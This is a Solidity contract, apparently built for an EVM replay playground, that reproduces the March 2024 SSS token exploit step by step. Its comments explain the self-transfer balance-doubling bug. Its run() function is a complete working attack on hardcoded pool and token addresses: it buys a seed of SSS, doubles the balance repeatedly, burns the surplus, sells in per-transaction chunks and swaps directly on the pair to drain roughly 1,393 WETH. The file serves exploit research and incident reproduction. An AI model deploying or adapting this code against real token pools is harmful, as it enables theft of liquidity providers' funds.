// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

// Synthetic standalone exploit for the EVM Playground (2024-03-SSS).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry
// `SSSExploit` test contract (attacker = address(this), using vm.deal to
// emulate a flash loan), so there is no standalone contract to deploy. This
// contract is a faithful, self-contained copy of that inline attack
// (testExploit body -> run()), so the playground can deploy it and record
// run(). Logic and constants are copied verbatim from test/SSS_exp.sol.
//
// Root cause: the SSS token's overridden ERC20 `_update` snapshots the
// sender's balance BEFORE the debit, then writes the recipient's balance from
// that stale snapshot + amount. There is no `from != to` guard, so a
// self-transfer's credit write (step 4) overwrites the debit write (step 3)
// using the pre-debit balance: `_balances[self] = old + amount`. Repeating
// with `amount = balance` DOUBLES the balance every call while totalSupply is
// untouched. The attacker buys a small seed of SSS, doubles it 17x via
// self-transfer, burns the surplus down to just under the pair's uint112
// ceiling, dumps the phantom SSS into the pool in per-tx-limit-sized chunks,
// then calls `pair.swap()` directly to pull ~1,393 WETH out — collateralised
// by SSS that was never minted.

interface IERC20Like {
    function balanceOf(address owner) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
}

interface IWETHLike is IERC20Like {
    function deposit() external payable;
}

interface ISSSLike is IERC20Like {
    function maxAmountPerTx() external view returns (uint256);
    function burn(uint256) external;
}

interface IUniRouterV2Like {
    function getAmountsIn(uint256 amountOut, address[] memory path) external view returns (uint256[] memory amounts);
    function getAmountsOut(uint256 amountIn, address[] memory path) external view returns (uint256[] memory amounts);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] memory path,
        address to,
        uint256 deadline
    ) external;
}

interface IUniPairV2Like {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract SSSSelfTransfer {
    address private constant POOL = 0x92F32553cC465583d432846955198F0DDcBcafA1;
    IWETHLike private constant WETH = IWETHLike(payable(0x4300000000000000000000000000000000000004));
    ISSSLike private constant SSS = ISSSLike(0xdfDCdbC789b56F99B0d0692d14DBC61906D9Deed);
    IUniRouterV2Like private constant ROUTER_V2 = IUniRouterV2Like(0x98994a9A7a2570367554589189dC9772241650f6);
    IUniPairV2Like private constant SSS_POOL = IUniPairV2Like(POOL);

    uint256 private constant ETH_FLASH_AMT = 1 ether;

    /// @notice The recorded entrypoint. The 1 ETH flash-loan seed capital is
    ///         sent to this contract as native ETH in the unrecorded setup
    ///         phase (standing in for the test's `vm.deal(this, 1 ether)`),
    ///         so run() wraps it into WETH itself, mirroring
    ///         `WETH.deposit{value: ethFlashAmt}()`. All WETH the attack
    ///         produces above the 1 WETH seed is profit, measured directly on
    ///         this contract's WETH balance.
    function run() external {
        require(address(this).balance >= ETH_FLASH_AMT, "need 1 ETH seed");

        // Approvals the test performed once in setUp().
        WETH.approve(address(ROUTER_V2), type(uint256).max);
        SSS.approve(address(ROUTER_V2), type(uint256).max);

        // 0) Wrap the seed ETH into WETH (mirrors WETH.deposit{value: ...}()).
        WETH.deposit{value: ETH_FLASH_AMT}();

        // 1) Buy a small seed of SSS with the 1 WETH flash-loan capital.
        address[] memory buyPath = new address[](2);
        buyPath[0] = address(WETH);
        buyPath[1] = address(SSS);
        ROUTER_V2.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            ETH_FLASH_AMT, 0, buyPath, address(this), block.timestamp
        );

        // 2) Self-transfer the full balance to itself repeatedly. Each call
        //    hits the buggy _update with from == to, so the stale-snapshot
        //    credit overwrites the debit and the balance DOUBLES every time.
        address[] memory sellPath = new address[](2);
        sellPath[0] = address(SSS);
        sellPath[1] = address(WETH);
        uint256 targetBal = ROUTER_V2.getAmountsIn(WETH.balanceOf(POOL) - 29.5 ether, sellPath)[0];
        while (SSS.balanceOf(address(this)) < targetBal) {
            SSS.transfer(address(this), SSS.balanceOf(address(this)));
        }

        // 3) Burn the surplus above targetBal so the working balance sits
        //    just under the pair's uint112 ceiling (else pair.swap's
        //    _update reverts with "ThrusterPair: OVERFLOW").
        SSS.burn(SSS.balanceOf(address(this)) - targetBal);

        // 4) Push the phantom SSS into the pair in maxAmountPerTx-sized
        //    chunks (direct transfer, not through the router) to avoid the
        //    per-tx limit, tracking how much the pool actually received.
        uint256 tokensLeft = targetBal;
        uint256 maxAmountPerTx = SSS.maxAmountPerTx();
        uint256 sssBalBeforeOnPair = SSS.balanceOf(POOL);
        while (tokensLeft > 0) {
            uint256 toSell = tokensLeft > maxAmountPerTx ? maxAmountPerTx - 1 : tokensLeft;
            SSS.transfer(POOL, toSell);
            tokensLeft -= toSell;
        }

        // 5) Call swap() on the pair directly to pull WETH out. The pair's
        //    K check reads balanceOf(), which is corrupted by the doubling
        //    bug, so it happily ships out (almost) its entire WETH reserve.
        uint256 targetETH = ROUTER_V2.getAmountsOut(SSS.balanceOf(POOL) - sssBalBeforeOnPair, sellPath)[1];
        SSS_POOL.swap(targetETH, 0, address(this), new bytes(0));

        // 6) Emulate repaying the 1 WETH flash loan.
        WETH.transfer(address(1), ETH_FLASH_AMT);

        // Remaining WETH balance (the seed already left this contract in
        // step 6) is the profit; it stays here for the recorder to measure
        // directly on the exploit contract (profitReceiver: "exploit").
    }

    // Accepts the native-ETH seed transferred in the unrecorded setup phase.
    receive() external payable {}
}
